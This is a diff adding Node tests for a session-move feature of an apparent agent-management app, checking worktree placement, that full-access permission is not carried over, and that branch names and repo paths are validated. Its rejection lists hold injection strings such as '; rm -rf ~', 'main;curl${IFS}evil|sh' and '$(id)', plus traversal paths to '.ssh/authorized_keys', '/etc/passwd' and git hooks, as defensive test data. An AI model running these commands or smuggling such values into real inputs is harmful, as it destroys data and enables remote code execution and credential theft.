@@ -1,8 +1,13 @@
 import assert from "node:assert/strict";
 import { test } from "node:test";
 import {
+  MOVE_ID,
+  arrivalMode,
+  arrivalRow,
   arrivedNoticeText,
   moveStepText,
+  safeBranch,
+  safeRepoPath,
   parseMovedTo,
   sameRemote,
 } from "../../lib/session-move-types";
@@ -86,4 +91,99 @@ test("the words of a move name the machine", () => {
   assert.match(notice, /now runs on Mac Studio \(macOS\)/);
   assert.match(notice, /\/Users\/me\/AgentOS\/app/);
   assert.match(notice, /big\.bin/);
+});
+
+test("arrivalRow: a session placed in a worktree works in that worktree", () => {
+  const wt = {
+    top: "/wt/app-main-abc123",
+    branch: "main-server",
+    worktree: true,
+  };
+  // At the repository's top
+  assert.deepEqual(arrivalRow(wt, "/wt/app-main-abc123", null), {
+    working_directory: "/wt/app-main-abc123",
+    worktree_path: "/wt/app-main-abc123",
+    branch_name: "main-server",
+  });
+  // In a subfolder: still that worktree, never Claude's own --worktree
+  // (branch_name without worktree_path is what asks for that)
+  const sub = arrivalRow(wt, "/wt/app-main-abc123/packages/web", null);
+  assert.equal(sub.working_directory, "/wt/app-main-abc123/packages/web");
+  assert.equal(sub.worktree_path, "/wt/app-main-abc123");
+  // A fresh clone is a plain checkout
+  assert.deepEqual(
+    arrivalRow(
+      { top: "/home/u/AgentOS/app", branch: "main", worktree: false },
+      "/home/u/AgentOS/app",
+      null
+    ),
+    {
+      working_directory: "/home/u/AgentOS/app",
+      worktree_path: null,
+      branch_name: null,
+    }
+  );
+});
+
+test("arrivalMode: full access never arrives unasked", () => {
+  assert.deepEqual(
+    arrivalMode({ permissionMode: "bypassPermissions", autoApprove: false }),
+    { mode: "auto", fullAccessOff: true }
+  );
+  assert.deepEqual(arrivalMode({ permissionMode: null, autoApprove: true }), {
+    mode: "auto",
+    fullAccessOff: true,
+  });
+  assert.deepEqual(
+    arrivalMode({ permissionMode: "acceptEdits", autoApprove: false }),
+    { mode: "acceptEdits", fullAccessOff: false }
+  );
+  // Junk from the other machine is no mode at all
+  assert.deepEqual(
+    arrivalMode({ permissionMode: "; rm -rf ~", autoApprove: false }),
+    { mode: null, fullAccessOff: false }
+  );
+});
+
+test("safeBranch and safeRepoPath: only plain names cross machines", () => {
+  for (const ok of ["main", "feat/login-2", "release/1.2.x", "user@topic"]) {
+    assert.ok(safeBranch(ok), ok);
+  }
+  for (const bad of [
+    "main;curl${IFS}evil|sh",
+    "feat/$(id)",
+    "-x",
+    "a b",
+    "a..b",
+    "it's",
+    "",
+    null,
+  ]) {
+    assert.ok(!safeBranch(bad), String(bad));
+  }
+  for (const ok of ["a.txt", "src/lib/x.ts", "docs/My File.md"]) {
+    assert.ok(safeRepoPath(ok), ok);
+  }
+  for (const bad of [
+    "../../.ssh/authorized_keys",
+    "/etc/passwd",
+    "a/../b",
+    "a//b",
+    ".git/config",
+    "sub/.GIT/hooks/x",
+    "a\\b",
+    "",
+  ]) {
+    assert.ok(!safeRepoPath(bad), bad);
+  }
+  assert.ok(MOVE_ID.test("0123456789abcdef"));
+  assert.ok(!MOVE_ID.test("../sessions/abc"));
+});
+
+test("moveStepText names the machine it leaves when that isn't this one", () => {
+  assert.equal(moveStepText("pausing", "the server"), "Pausing it here");
+  assert.equal(
+    moveStepText("pausing", "the server", "Mac Studio"),
+    "Pausing it on Mac Studio"
+  );
 });
